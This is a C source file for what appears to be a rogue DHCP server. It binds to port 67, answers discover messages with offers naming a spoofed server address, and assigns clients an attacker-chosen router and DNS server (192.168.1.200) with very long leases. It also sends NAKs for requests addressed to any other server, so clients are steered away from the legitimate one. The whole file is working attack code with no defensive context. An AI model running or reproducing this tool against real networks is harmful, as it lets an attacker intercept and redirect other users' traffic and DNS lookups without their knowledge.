#define _POSIX_C_SOURCE 199309L

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "dhcp.h"

enum {
    dhcp_server_port = 67,
    dhcp_client_port = 68,

    orig_dhcp_ip_1   = 192,
    orig_dhcp_ip_2   = 168,
    orig_dhcp_ip_3   = 1,
    orig_dhcp_ip_4   = 1,

    spoof_dhcp_ip_1  = 192,
    spoof_dhcp_ip_2  = 168,
    spoof_dhcp_ip_3  = 1,
    spoof_dhcp_ip_4  = 254,

    conf_ip_addr_1   = 1,
    conf_ip_addr_2   = 2,
    conf_ip_addr_3   = 3,
    conf_ip_addr_4   = 4,

    conf_subnet_mask_1 = 255,
    conf_subnet_mask_2 = 255,
    conf_subnet_mask_3 = 255,
    conf_subnet_mask_4 = 0,

    conf_broadcast_addr_1 = 192,
    conf_broadcast_addr_2 = 168,
    conf_broadcast_addr_3 = 1,
    conf_broadcast_addr_4 = 255,

    conf_router_ip_1 = 192,
    conf_router_ip_2 = 168,
    conf_router_ip_3 = 1,
    conf_router_ip_4 = 200,

    conf_dns_ip_1 = 192,
    conf_dns_ip_2 = 168,
    conf_dns_ip_3 = 1,
    conf_dns_ip_4 = 200
};

#define ip_to_num(i1, i2, i3, i4) (i1 | (i2 << 8) | (i3 << 16) | (i4 << 24))

size_t dhcp_reply_ack(struct dhcp_msg *msg, enum dhcp_msg_type msg_type_ack, uint8_t dhcp_ip[4]) {
    uint8_t opt_data[1];
    dhcp_opt_offset offset;

    msg->opcode = dhcp_opcode_reply;
    msg->hops = 0;
    msg->secs = 0;
    msg->flags = htons(0x8000);
    msg->ciaddr = 0;
    msg->yiaddr = 0;
    msg->siaddr = 0;
    msg->giaddr = 0;

    offset = dhcp_opt_begin(msg);

    opt_data[0] = msg_type_ack;
    offset = dhcp_opt(msg, offset, dhcp_opt_msg_type, opt_data, 1);

    if(dhcp_ip != NULL) {
        offset = dhcp_opt(msg, offset, dhcp_opt_srv_id, dhcp_ip, 4);
    }

    offset = dhcp_opt_end(msg, offset);

    return sizeof(struct dhcp_msg) - sizeof(msg->options) + offset * sizeof(uint8_t);
}

size_t dhcp_reply_offer(struct dhcp_msg *msg) {
    uint8_t opt_data[4];
    dhcp_opt_offset offset;

    msg->opcode = dhcp_opcode_reply;
    msg->hops = 0;
    msg->secs = 0;
    msg->flags = htons(0x8000);
    msg->ciaddr = 0;
    msg->yiaddr = ip_to_num(conf_ip_addr_1, conf_ip_addr_2, conf_ip_addr_3, conf_ip_addr_4);
    msg->siaddr = ip_to_num(spoof_dhcp_ip_1, spoof_dhcp_ip_2, spoof_dhcp_ip_3, spoof_dhcp_ip_4);
    msg->giaddr = 0;

    offset = dhcp_opt_begin(msg);

    opt_data[0] = dhcp_msg_type_offer;
    offset = dhcp_opt(msg, offset, dhcp_opt_msg_type, opt_data, 1);

    opt_data[0] = spoof_dhcp_ip_1;
    opt_data[1] = spoof_dhcp_ip_2;
    opt_data[2] = spoof_dhcp_ip_3;
    opt_data[3] = spoof_dhcp_ip_4;
    offset = dhcp_opt(msg, offset, dhcp_opt_srv_id, opt_data, 4);

    opt_data[0] = 128;
    opt_data[1] = 255;
    opt_data[2] = 255;
    opt_data[3] = 255;
    offset = dhcp_opt(msg, offset, dhcp_opt_address_time, opt_data, 4);
    offset = dhcp_opt(msg, offset, dhcp_opt_renewal_time, opt_data, 4);
    offset = dhcp_opt(msg, offset, dhcp_opt_rebinding_time, opt_data, 4);

    opt_data[0] = conf_subnet_mask_1;
    opt_data[1] = conf_subnet_mask_2;
    opt_data[2] = conf_subnet_mask_3;
    opt_data[3] = conf_subnet_mask_4;
    offset = dhcp_opt(msg, offset, dhcp_opt_subnet_mask, opt_data, 4);

    opt_data[0] = conf_broadcast_addr_1;
    opt_data[1] = conf_broadcast_addr_2;
    opt_data[2] = conf_broadcast_addr_3;
    opt_data[3] = conf_broadcast_addr_4;
    offset = dhcp_opt(msg, offset, dhcp_opt_broadcast_address, opt_data, 4);

    opt_data[0] = conf_router_ip_1;
    opt_data[1] = conf_router_ip_2;
    opt_data[2] = conf_router_ip_3;
    opt_data[3] = conf_router_ip_4;
    offset = dhcp_opt(msg, offset, dhcp_opt_router, opt_data, 4);

    opt_data[0] = conf_dns_ip_1;
    opt_data[1] = conf_dns_ip_2;
    opt_data[2] = conf_dns_ip_3;
    opt_data[3] = conf_dns_ip_4;
    offset = dhcp_opt(msg, offset, dhcp_opt_dns, opt_data, 4);

    offset = dhcp_opt_end(msg, offset);

    return sizeof(struct dhcp_msg) - sizeof(msg->options) + offset * sizeof(uint8_t);
}

size_t dhcp_handle_request(struct dhcp_msg *msg) {
    uint8_t *opt_data_ptr;

    if(dhcp_opt_get(msg, dhcp_opt_srv_id, &opt_data_ptr) != 4) {
        opt_data_ptr = NULL;
    }

    if(
        opt_data_ptr != NULL &&
        opt_data_ptr[0] == spoof_dhcp_ip_1 &&
        opt_data_ptr[1] == spoof_dhcp_ip_2 &&
        opt_data_ptr[2] == spoof_dhcp_ip_3 &&
        opt_data_ptr[3] == spoof_dhcp_ip_4
    ) {
        return dhcp_reply_ack(msg, dhcp_msg_type_ack, opt_data_ptr);
    }

    return dhcp_reply_ack(msg, dhcp_msg_type_nak, opt_data_ptr);
}

ssize_t dhcp_create_reply(struct dhcp_msg *msg) {
    uint8_t *opt_data_ptr;

    if(dhcp_opt_get(msg, dhcp_opt_msg_type, &opt_data_ptr) != 1) {
        return -1;
    }

    switch(*opt_data_ptr) {
        case dhcp_msg_type_request:
            return dhcp_handle_request(msg);

        case dhcp_msg_type_discover:
            return dhcp_reply_offer(msg);
    }

    return -1;
}

void dhcp_handle_msg(int socket_fd, struct dhcp_msg *msg) {
    struct sockaddr_in client_addr;
    ssize_t reply_size;

    reply_size = dhcp_create_reply(msg);
    if(reply_size < 0) {
        return;
    }

    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    client_addr.sin_port = htons(dhcp_client_port);

    if(sendto(socket_fd, msg, reply_size, 0, (struct sockaddr *) &client_addr, sizeof(client_addr)) < 0) {
        perror("sendto()");
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    int socket_fd;
    int sockopt;
    struct sockaddr_in serv_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len;
    ssize_t msg_len;
    struct dhcp_msg msg;

    if((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) { 
        perror("socket()"); 
        exit(EXIT_FAILURE); 
    }

    sockopt = 1;
    if(setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof(sockopt)) < 0) {
        perror("setsockopt()");
        exit(EXIT_FAILURE);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(dhcp_server_port);

    if(bind(socket_fd, (const struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("bind()");
        exit(EXIT_FAILURE);
    }

    client_addr_len = sizeof(client_addr);

    while((msg_len = recvfrom(socket_fd, &msg, sizeof(msg), 0, (struct sockaddr *) &client_addr, &client_addr_len)) > 0) {
        if(msg_len < sizeof(msg) - sizeof(msg.options)) {
            printf("Received incomplete message on DHCP port\n");
            continue;
        }

        /*printf("DHCP message from %s\n", inet_ntoa(client_addr.sin_addr));
        printf("|-opcode: %d\n", msg.opcode);
        printf("|-xid: %x\n", ntohl(msg.xid));
        if(msg.hlen == 6) {
            printf("|-chaddr: %x:%x:%x:%x:%x:%x\n", msg.chaddr[0], msg.chaddr[1], msg.chaddr[2], msg.chaddr[3], msg.chaddr[4], msg.chaddr[5]);
        }
        printf("|-sname: %s\n", msg.sname);
        printf("|-filename: %s\n", msg.filename);
        printf("\n");*/

        dhcp_handle_msg(socket_fd, &msg);
    }

    return EXIT_SUCCESS;
}
